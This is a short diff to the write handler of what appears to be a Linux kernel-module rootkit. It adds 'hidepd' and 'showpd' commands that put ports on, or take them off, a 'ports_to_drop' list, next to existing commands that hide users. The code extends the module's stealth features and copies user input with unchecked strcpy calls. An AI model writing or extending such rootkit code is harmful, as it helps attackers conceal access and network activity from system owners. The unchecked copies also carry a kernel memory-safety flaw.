@@ -54,7 +54,12 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
             insert_node(&users_to_hide, last_data);
         }
     }
-
+    if(memcmp("hidepd ", tmpdata, strlen("hidepd ")) == 0){
+        if(strlen(tmpdata) > strlen("hidepd ")){
+            strcpy(last_data, tmpdata + strlen("hidepd "));
+            insert_node(&ports_to_drop, last_data);
+        }
+    }
     if(memcmp("show ", tmpdata, strlen("show ")) == 0){
         if(strlen(tmpdata) > strlen("show ") + 3){
             strcpy(last_data, tmpdata + strlen("show "));
@@ -77,6 +82,12 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         if(strlen(tmpdata) > strlen("showu ")){
             strcpy(last_data, tmpdata + strlen("showu "));
             remove_node_by_name(&users_to_hide, last_data);
+        }
+    }
+    if(memcmp("showpd ", tmpdata, strlen("showpd ")) == 0){
+        if(strlen(tmpdata) > strlen("showpd ")){
+            strcpy(last_data, tmpdata + strlen("showpd "));
+            remove_node_by_name(&ports_to_drop, last_data);
         }
     }
     return 0;
